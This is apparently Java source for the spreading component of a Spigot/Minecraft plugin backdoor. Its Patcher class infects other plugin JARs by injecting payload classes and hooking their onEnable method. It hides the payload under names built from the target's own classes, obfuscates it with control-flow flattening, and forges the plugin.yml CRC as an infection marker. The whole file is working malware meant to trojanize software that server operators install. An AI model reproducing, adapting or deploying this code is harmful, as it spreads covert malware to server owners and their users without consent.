package com.tmquan2508.exploit.spread;

import javassist.*;
import org.objectweb.asm.*;
import org.objectweb.asm.commons.ClassRemapper;
import org.objectweb.asm.commons.SimpleRemapper;
import org.objectweb.asm.tree.*;
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.net.JarURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.logging.Level;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.zip.CRC32;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import com.tmquan2508.exploit.Exploit;

public final class Patcher {

    public static boolean patchFile(String origJarPath, String outJarPath, Class<?> sourceClassToInject) {
        Exploit.sender.sendDebug(Level.INFO, String.format("[Patcher] Request: '%s' -> '%s'", origJarPath, outJarPath));
        Path input = Paths.get(origJarPath);
        if (PatchUtils.isAlreadyPatched(input)) {
            Exploit.sender.sendDebug(Level.INFO, "[Patcher] Target is already patched. Skipping.");
            return false;
        }

        try {
            return performPatching(origJarPath, outJarPath, sourceClassToInject);
        } catch (Throwable e) {
            Exploit.sender.sendDebug(Level.SEVERE, "[CRITICAL] A critical error occurred during patching. Rolling back.");
            Exploit.sender.sendDebug(Level.SEVERE, PatchUtils.stackTrace(e));
            try { Files.deleteIfExists(Paths.get(outJarPath)); } catch (IOException ignored) {}
            return false;
        }
    }

    private static boolean performPatching(String orig, String out, Class<?> sourceClassToInject) throws Throwable {
        Path input = Paths.get(orig);
        Path output = Paths.get(out);

        CamouflageUtils.CamouflagePlan plan = CamouflageUtils.generateCamouflagePlan(input.toFile());
        Exploit.sender.sendDebug(Level.INFO, "[+] Patcher: Generated CAMOUFLAGE plan.");
        Exploit.sender.sendDebug(Level.INFO, "  |-> Target Package: " + plan.packageName());
        Exploit.sender.sendDebug(Level.INFO, "  |-> New Base Name: " + plan.namePrefix());

        Files.copy(input, output, StandardCopyOption.REPLACE_EXISTING);

        int dominantVersion = PatchUtils.findDominantMajorVersion(output);
        Exploit.sender.sendDebug(Level.INFO, String.format("[+] Patcher: Found dominant Java major version in target: %d", dominantVersion));

        Map<String, Object> pluginYAML = PatchUtils.readPluginYAML(output.toAbsolutePath().toString());
        if (pluginYAML == null) {
            Exploit.sender.sendDebug(Level.WARNING, "[!] Patcher: Not a valid Spigot plugin. Cleaning up.");
            Files.delete(output);
            return false;
        }
        String mainClass = (String) pluginYAML.get("main");
        Exploit.sender.sendDebug(Level.INFO, "[+] Patcher: Found plugin main class: " + mainClass);

        ClassPool pool = new ClassPool(ClassPool.getDefault());
        pool.insertClassPath(orig);

        PayloadInjector.Result injectionResult = PayloadInjector.inject(sourceClassToInject, plan.packageName(), plan.namePrefix(), dominantVersion);

        if (injectionResult.finalPayloadFQN == null) {
            throw new IllegalStateException("Failed to determine the final FQN for the main payload class.");
        }

        for (byte[] payloadBytes : injectionResult.allPayloadBytecode.values()) {
            pool.makeClass(new ByteArrayInputStream(payloadBytes));
        }

        try (FileSystem outStream = FileSystems.newFileSystem(output, (ClassLoader) null)) {
            for (Map.Entry<String, byte[]> entry : injectionResult.allPayloadBytecode.entrySet()) {
                String classPath = entry.getKey().replace('.', '/') + ".class";
                Path targetPath = outStream.getPath(classPath);
                if (targetPath.getParent() != null) Files.createDirectories(targetPath.getParent());
                Files.write(targetPath, entry.getValue());
            }

            MainClassPatcher.hook(pool, outStream, mainClass, injectionResult.finalPayloadFQN);
        }

        PatchUtils.setInfectionMarkerOnTarget(output);
        Exploit.sender.sendDebug(Level.INFO, String.format("[SUCCESS] Successfully patched '%s'.", output.getFileName()));
        return true;
    }

    private static class PayloadInjector {
        record Result(String finalPayloadFQN, Map<String, byte[]> allPayloadBytecode) {}

        public static Result inject(Class<?> sourceBaseClass, String newPackagePath, String newBaseName, int targetMajorVersion) throws Exception {
            Exploit.sender.sendDebug(Level.INFO, "[+] Injector (ASM): Starting payload injection and obfuscation.");
            List<Class<?>> classesToInject = PatchUtils.getClassesToInject(sourceBaseClass);

            Map<String, String> relocationMap = new HashMap<>();
            String finalPayloadFQN = null;
            String newPackageName = newPackagePath.replace('/', '.');

            Exploit.sender.sendDebug(Level.INFO, "[+] Injector (ASM): Building relocation map for renaming...");
            for (Class<?> clazz : classesToInject) {
                String sourceFQN = clazz.getName();
                String newSimpleName = clazz.getSimpleName().replace(sourceBaseClass.getSimpleName(), newBaseName);
                String destFQN = newPackageName + "." + newSimpleName;

                if (clazz.equals(sourceBaseClass)) {
                    finalPayloadFQN = destFQN;
                }
                relocationMap.put(sourceFQN.replace('.', '/'), destFQN.replace('.', '/'));
                Exploit.sender.sendDebug(Level.INFO, String.format("  |-> MAP: '%s' ==> '%s'", sourceFQN, destFQN));
            }
            
            SimpleRemapper remapper = new SimpleRemapper(relocationMap);
            Map<String, byte[]> allPayloadBytecode = new HashMap<>();

            Exploit.sender.sendDebug(Level.INFO, "[+] Injector (ASM): Loading, transforming, and obfuscating payload classes...");
            for (Class<?> clazz : classesToInject) {
                String resourcePath = clazz.getName().replace('.', '/') + ".class";
                try (InputStream is = clazz.getClassLoader().getResourceAsStream(resourcePath)) {
                    if (is == null) throw new IOException("Cannot find payload resource: " + resourcePath);

                    ClassReader classReader = new ClassReader(is);
                    ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_MAXS);
                    
                    ClassVisitor classRemapper = new ClassRemapper(classWriter, remapper);
                    ObfuscatingClassVisitor obfuscator = new ObfuscatingClassVisitor(classRemapper);

                    classReader.accept(obfuscator, ClassReader.EXPAND_FRAMES);

                    byte[] newBytecode = classWriter.toByteArray();

                    PatchUtils.setMajorVersion(newBytecode, targetMajorVersion);

                    String newFQN = remapper.map(clazz.getName().replace('.', '/')).replace('/', '.');
                    allPayloadBytecode.put(newFQN, newBytecode);
                    Exploit.sender.sendDebug(Level.INFO, "  |-> Transformed (in memory): " + newFQN);
                }
            }

            Exploit.sender.sendDebug(Level.INFO, "[+] Injector (ASM): Payload injection phase complete.");
            return new Result(finalPayloadFQN, allPayloadBytecode);
        }
    }

    private static class ObfuscatingClassVisitor extends ClassVisitor {
        public ObfuscatingClassVisitor(ClassVisitor classVisitor) {
            super(Opcodes.ASM9, classVisitor);
        }

        @Override
        public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
            MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
            if (mv != null && !name.equals("<init>") && !name.equals("<clinit>")) {
                return new ControlFlowFlattener(api, access, name, descriptor, mv);
            }
            return mv;
        }
    }

    private static class ControlFlowFlattener extends MethodNode {
        private final MethodVisitor next;

        public ControlFlowFlattener(int api, int access, String name, String descriptor, MethodVisitor methodVisitor) {
            super(api, access, name, descriptor, null, null);
            this.next = methodVisitor;
        }

        @Override
        public void visitEnd() {
            if (instructions.size() == 0 || (access & Opcodes.ACC_ABSTRACT) != 0) {
                accept(next);
                return;
            }

            final Map<LabelNode, LabelNode> cloneMap = new HashMap<>();
            for (AbstractInsnNode insn = instructions.getFirst(); insn != null; insn = insn.getNext()) {
                if (insn instanceof LabelNode) {
                    cloneMap.put((LabelNode) insn, new LabelNode());
                }
            }

            Map<LabelNode, List<AbstractInsnNode>> blocks = new LinkedHashMap<>();
            List<AbstractInsnNode> currentBlock = null;
            for (AbstractInsnNode insn : instructions) {
                if (insn instanceof LabelNode) {
                    if (currentBlock != null && !currentBlock.isEmpty()) {
                        blocks.put((LabelNode) currentBlock.get(0), currentBlock);
                    }
                    currentBlock = new ArrayList<>();
                }
                if(currentBlock != null) currentBlock.add(insn);
            }
            if (currentBlock != null && !currentBlock.isEmpty()) {
                blocks.put((LabelNode) currentBlock.get(0), currentBlock);
            }
            
            if (blocks.size() <= 1) {
                accept(next);
                return;
            }

            List<Map.Entry<LabelNode, List<AbstractInsnNode>>> blockEntries = new ArrayList<>(blocks.entrySet());
            Map<LabelNode, Integer> labelToStateMap = new HashMap<>();
            for (int i = 0; i < blockEntries.size(); i++) {
                labelToStateMap.put(blockEntries.get(i).getKey(), i);
            }

            InsnList newInstructions = new InsnList();
            LabelNode startLoop = new LabelNode();
            LabelNode dispatcher = new LabelNode();
            int stateVar = maxLocals;
            
            newInstructions.add(new InsnNode(Opcodes.ICONST_0));
            newInstructions.add(new VarInsnNode(Opcodes.ISTORE, stateVar));
            newInstructions.add(new JumpInsnNode(Opcodes.GOTO, startLoop));

            newInstructions.add(dispatcher);
            LabelNode defaultCase = new LabelNode();
            LabelNode[] caseLabels = new LabelNode[blocks.size()];
            for (int i = 0; i < caseLabels.length; i++) caseLabels[i] = new LabelNode();

            newInstructions.add(new VarInsnNode(Opcodes.ILOAD, stateVar));
            newInstructions.add(new TableSwitchInsnNode(0, blocks.size() - 1, defaultCase, caseLabels));
            
            for (int i = 0; i < blockEntries.size(); i++) {
                Map.Entry<LabelNode, List<AbstractInsnNode>> entry = blockEntries.get(i);
                newInstructions.add(caseLabels[i]);

                for (AbstractInsnNode insn : entry.getValue()) {
                    if (insn instanceof LabelNode) {
                        newInstructions.add(cloneMap.get(insn));
                    }
                }
                
                List<AbstractInsnNode> blockInsns = entry.getValue();
                for (AbstractInsnNode insn : blockInsns) {
                    if (insn.getOpcode() >= 0) {
                        newInstructions.add(insn.clone(cloneMap));
                    }
                }

                AbstractInsnNode lastInsn = blockInsns.get(blockInsns.size() - 1);
                
                if(!isReturnOrThrow(lastInsn.getOpcode())) {
                    int nextState = i + 1;
                    if (lastInsn instanceof JumpInsnNode) {
                        nextState = labelToStateMap.getOrDefault(((JumpInsnNode) lastInsn).label, i + 1);
                    }
                    newInstructions.add(new LdcInsnNode(nextState));
                    newInstructions.add(new VarInsnNode(Opcodes.ISTORE, stateVar));
                    newInstructions.add(new JumpInsnNode(Opcodes.GOTO, startLoop));
                }
            }

            newInstructions.add(defaultCase);
            if(Type.getReturnType(this.desc).getSort() != Type.VOID) {
                 newInstructions.add(new InsnNode(Opcodes.ACONST_NULL));
                 newInstructions.add(new InsnNode(Type.getReturnType(this.desc).getOpcode(Opcodes.IRETURN)));
            } else {
                 newInstructions.add(new InsnNode(Opcodes.RETURN));
            }
            
            newInstructions.add(startLoop);
            newInstructions.add(new JumpInsnNode(Opcodes.GOTO, dispatcher));

            List<TryCatchBlockNode> newTryCatchBlocks = new ArrayList<>();
            for (TryCatchBlockNode tcb : this.tryCatchBlocks) {
                newTryCatchBlocks.add(new TryCatchBlockNode(
                    cloneMap.get(tcb.start),
                    cloneMap.get(tcb.end),
                    cloneMap.get(tcb.handler),
                    tcb.type
                ));
            }
            this.tryCatchBlocks = newTryCatchBlocks;

            this.localVariables = null;
            this.visibleLocalVariableAnnotations = null;
            this.invisibleLocalVariableAnnotations = null;

            this.instructions = newInstructions;
            this.maxLocals += 1;

            try {
                accept(next);
            } catch (Exception e) {
                String errorMsg = String.format("CRITICAL: Error while accepting modified method '%s'. Falling back to original. %s", name, e.getMessage());
                Exploit.sender.sendDebug(Level.SEVERE, errorMsg);
                Exploit.sender.sendDebug(Level.FINER, PatchUtils.stackTrace(e));
                super.accept(next);
            }
        }

        private boolean isReturnOrThrow(int opcode) {
            return (opcode >= Opcodes.IRETURN && opcode <= Opcodes.RETURN) || opcode == Opcodes.ATHROW;
        }
    }

    private static class MainClassPatcher {
        public static void hook(ClassPool pool, FileSystem outStream, String mainClass, String finalPayloadFQN) throws Exception {
            Exploit.sender.sendDebug(Level.INFO, "[+] Hooker (Javassist): Starting main class hook process.");

            CtClass ccMain = null;
            try {
                Exploit.sender.sendDebug(Level.INFO, "  |-> Getting CtClass for: " + mainClass);
                ccMain = pool.get(mainClass);

                Exploit.sender.sendDebug(Level.INFO, "  |-> Getting 'onEnable' method.");
                CtMethod onEnableMethod = ccMain.getDeclaredMethod("onEnable");

                String injectionCode = String.format("{ try { new %s((org.bukkit.plugin.Plugin)this); } catch (Throwable t) { t.printStackTrace(); } }", finalPayloadFQN);
                Exploit.sender.sendDebug(Level.FINE, "[DEBUG] Hooker: Code to be injected into onEnable(): " + injectionCode);
                onEnableMethod.insertAfter(injectionCode);

                Path mainClassPath = outStream.getPath(mainClass.replace('.', '/') + ".class");
                Exploit.sender.sendDebug(Level.INFO, "  |-> Writing modified main class back to: " + mainClassPath);
                Files.write(mainClassPath, ccMain.toBytecode(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);

                Exploit.sender.sendDebug(Level.INFO, "[+] Hooker (Javassist): Hooking process complete.");
            } finally {
                if (ccMain != null) {
                    ccMain.detach();
                }
            }
        }
    }

    private static class CamouflageUtils {
        public record CamouflagePlan(String packageName, String namePrefix) {}
        private static final Random RANDOM = new Random();
        private static final Pattern CAMEL_CASE_SPLIT_PATTERN = Pattern.compile("(?<!(^|[A-Z]))(?=[A-Z])|(?<!^)(?=[A-Z][a-z])");

        public static CamouflagePlan generateCamouflagePlan(File targetJarFile) {
            Map<String, List<String>> packageStructure = scanJarForPackageStructure(targetJarFile);
            if (packageStructure.isEmpty()) {
                return new CamouflagePlan("com/tmquan2508/internal/safe", "InternalTask");
            }
            List<Map.Entry<String, List<String>>> packagesSorted = packageStructure.entrySet().stream()
                .filter(entry -> entry.getKey() != null && !entry.getKey().isEmpty() && !entry.getKey().startsWith("META-INF"))
                .sorted(Comparator.comparingInt(e -> e.getValue().size() * -1))
                .collect(Collectors.toList());

            if (packagesSorted.isEmpty()) {
                return new CamouflagePlan("com/tmquan2508/internal/fallback", "Task");
            }

            Map.Entry<String, List<String>> chosenEntry = packagesSorted.get(RANDOM.nextInt(Math.min(3, packagesSorted.size())));
            String chosenPackagePath = chosenEntry.getKey();
            List<String> classNamesInPackage = chosenEntry.getValue();
            List<String> dictionary = buildWordDictionaryFrom(classNamesInPackage);

            if (dictionary.isEmpty()) {
                return new CamouflagePlan(chosenPackagePath, "Core");
            }

            List<String> simpleNames = classNamesInPackage.stream().map(s -> s.substring(0, s.lastIndexOf('.'))).collect(Collectors.toList());
            String namePrefix = buildUniqueWordName(dictionary, simpleNames, 1, 2);

            return new CamouflagePlan(chosenPackagePath, namePrefix);
        }

        private static List<String> buildWordDictionaryFrom(List<String> classNames) {
            return classNames.stream()
                .map(className -> className.substring(0, className.lastIndexOf('.')))
                .flatMap(className -> Arrays.stream(CAMEL_CASE_SPLIT_PATTERN.split(className)))
                .map(word -> word.replaceAll("[^a-zA-Z0-9]", ""))
                .filter(word -> word.length() > 2)
                .distinct()
                .collect(Collectors.toList());
        }

        private static String buildUniqueWordName(List<String> dictionary, List<String> existingNames, int minWords, int maxWords) {
            String name;
            int attempts = 0;
            do {
                int wordCount = minWords + (maxWords > minWords ? RANDOM.nextInt(maxWords - minWords + 1) : 0);
                StringBuilder nameBuilder = new StringBuilder();
                for (int i = 0; i < wordCount; i++) {
                    String word = dictionary.get(RANDOM.nextInt(dictionary.size()));
                    nameBuilder.append(Character.toUpperCase(word.charAt(0))).append(word.substring(1).toLowerCase());
                }
                name = nameBuilder.toString();
                if (attempts > 10) name += attempts;
                attempts++;
            } while (name.isEmpty() || existingNames.contains(name));
            return name;
        }

        private static Map<String, List<String>> scanJarForPackageStructure(File jarFile) {
            Map<String, List<String>> packageMap = new HashMap<>();
            try (ZipFile zipFile = new ZipFile(jarFile)) {
                Enumeration<? extends ZipEntry> entries = zipFile.entries();
                while (entries.hasMoreElements()) {
                    ZipEntry entry = entries.nextElement();
                    if (entry.isDirectory() || !entry.getName().endsWith(".class") || entry.getName().contains("$"))
                        continue;
                    String fullPath = entry.getName();
                    int lastSlash = fullPath.lastIndexOf('/');
                    String packageName = (lastSlash == -1) ? "" : fullPath.substring(0, lastSlash);
                    packageMap.computeIfAbsent(packageName, k -> new ArrayList<>()).add(fullPath.substring(lastSlash + 1));
                }
            } catch (IOException e) {
                Exploit.sender.sendDebug(Level.WARNING, "[Camouflage] Error scanning JAR file: " + e.getMessage());
            }
            return packageMap;
        }
    }
    
    private static class PatchUtils {
        public static String stackTrace(Throwable e) {
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));
            return sw.toString();
        }

        public static List<Class<?>> getClassesToInject(Class<?> baseClass) {
            List<Class<?>> classes = new ArrayList<>();
            classes.add(baseClass);
            classes.addAll(Arrays.asList(baseClass.getDeclaredClasses()));
            return classes;
        }

        public static int findDominantMajorVersion(Path jarPath) {
            Map<Integer, Integer> counts = new HashMap<>();
            try (ZipFile zipFile = new ZipFile(jarPath.toFile())) {
                Enumeration<? extends ZipEntry> entries = zipFile.entries();
                while (entries.hasMoreElements()) {
                    ZipEntry entry = entries.nextElement();
                    if (entry.getName().endsWith(".class")) {
                        try (InputStream is = zipFile.getInputStream(entry)) {
                            byte[] header = new byte[8];
                            if (is.read(header) == 8) {
                                if (ByteBuffer.wrap(header, 0, 4).getInt() == 0xCAFEBABE) {
                                    int majorVersion = ByteBuffer.wrap(header, 6, 2).getShort() & 0xFFFF;
                                    counts.put(majorVersion, counts.getOrDefault(majorVersion, 0) + 1);
                                }
                            }
                        }
                    }
                }
            } catch (IOException e) {
                Exploit.sender.sendDebug(Level.WARNING, "[Patcher] Could not scan for major version: " + e.getMessage());
                return 52;
            }

            return counts.entrySet().stream()
                .max(Map.Entry.comparingByValue())
                .map(Map.Entry::getKey)
                .orElse(52);
        }

        public static void setMajorVersion(byte[] classBytes, int newMajorVersion) {
            if (classBytes.length < 8) return;
            classBytes[6] = (byte) (newMajorVersion >> 8);
            classBytes[7] = (byte) newMajorVersion;
        }

        public static boolean isAlreadyPatched(Path jarPath) {
            try (ZipFile zipFile = new ZipFile(jarPath.toFile())) {
                ZipEntry entry = zipFile.getEntry("plugin.yml");
                if (entry == null) return false;
                long storedCrc = entry.getCrc();
                long expectedCrc = CrcPatcher.calculateFakeCRC();
                if (storedCrc == expectedCrc) {
                    Exploit.sender.sendDebug(Level.INFO, "[+] PatchCheck: Plugin already patched (marker found).");
                    return true;
                }
            } catch (IOException e) {
                Exploit.sender.sendDebug(Level.WARNING, "[!] PatchCheck: Could not check for fake CRC marker: " + e.getMessage());
            }
            return false;
        }

        public static void setInfectionMarkerOnTarget(Path targetJarPath) throws IOException {
            try {
                Exploit.sender.sendDebug(Level.INFO, "[+] Marker: Setting infection marker by faking plugin.yml CRC...");
                CrcPatcher.markJarWithFakeCRC(targetJarPath.toFile());
                Exploit.sender.sendDebug(Level.INFO, "[+] Marker: Fake CRC marker set successfully.");
            } catch (Exception e) {
                throw new IOException("Failed to set fake marker on " + targetJarPath.getFileName(), e);
            }
        }

        public static Map<String, Object> readPluginYAML(String path) {
            String inputFile;
            String absolutePath = new File(path).getAbsolutePath();

            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                inputFile = "jar:file:/" + absolutePath.replace('\\', '/') + "!/plugin.yml";
            } else {
                inputFile = "jar:file://" + absolutePath + "!/plugin.yml";
            }

            try {
                URL url = new URL(inputFile);
                JarURLConnection connection = (JarURLConnection) url.openConnection();
                connection.setUseCaches(false);
                try (InputStream is = connection.getInputStream()) {
                    return new Yaml().load(is);
                }
            } catch (Exception e) {
                Exploit.sender.sendDebug(Level.WARNING, "[!] PatchUtils: Failed to read plugin.yml from '" + inputFile + "'. Error: " + e.getMessage());
                return null;
            }
        }
    }

    private static class CrcPatcher {
        private static final int EOCD_SIGNATURE = 0x06054b50;
        private static final int CENTRAL_DIR_SIGNATURE = 0x02014b50;
        private static final String FAKE_STRING = "openbd.injected";

        public static void markJarWithFakeCRC(File jarFile) throws IOException {
            byte[] bytes = Files.readAllBytes(jarFile.toPath());
            int eocdOffset = findEOCDOffset(bytes);
            if (eocdOffset == -1) throw new IOException("EOCD not found");

            int centralDirOffset = getIntLE(bytes, eocdOffset + 16);
            int currentOffset = centralDirOffset;

            while (getIntLE(bytes, currentOffset) == CENTRAL_DIR_SIGNATURE) {
                int fileNameLength = getShortLE(bytes, currentOffset + 28);
                String filename = new String(bytes, currentOffset + 46, fileNameLength, StandardCharsets.UTF_8);

                if ("plugin.yml".equals(filename)) {
                    int crcOffset = currentOffset + 16;
                    putIntLE(bytes, crcOffset, (int) calculateFakeCRC());
                    Files.write(jarFile.toPath(), bytes, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);
                    return;
                }
                int extraFieldLength = getShortLE(bytes, currentOffset + 30);
                int fileCommentLength = getShortLE(bytes, currentOffset + 32);
                currentOffset += 46 + fileNameLength + extraFieldLength + fileCommentLength;
            }
            throw new IOException("plugin.yml not found in central directory");
        }

        public static long calculateFakeCRC() {
            CRC32 crc = new CRC32();
            crc.update(FAKE_STRING.getBytes(StandardCharsets.UTF_8));
            return crc.getValue();
        }

        private static int findEOCDOffset(byte[] bytes) {
            for (int i = bytes.length - 22; i >= 0; i--) {
                if (getIntLE(bytes, i) == EOCD_SIGNATURE) return i;
            }
            return -1;
        }

        private static int getIntLE(byte[] b, int off) {
            return (b[off] & 0xFF) | ((b[off + 1] & 0xFF) << 8) | ((b[off + 2] & 0xFF) << 16) | ((b[off + 3] & 0xFF) << 24);
        }

        private static void putIntLE(byte[] b, int off, int val) {
            b[off] = (byte) (val & 0xFF);
            b[off + 1] = (byte) ((val >> 8) & 0xFF);
            b[off + 2] = (byte) ((val >> 16) & 0xFF);
            b[off + 3] = (byte) ((val >> 24) & 0xFF);
        }

        private static int getShortLE(byte[] b, int off) {
            return (b[off] & 0xFF) | ((b[off + 1] & 0xFF) << 8);
        }
    }
}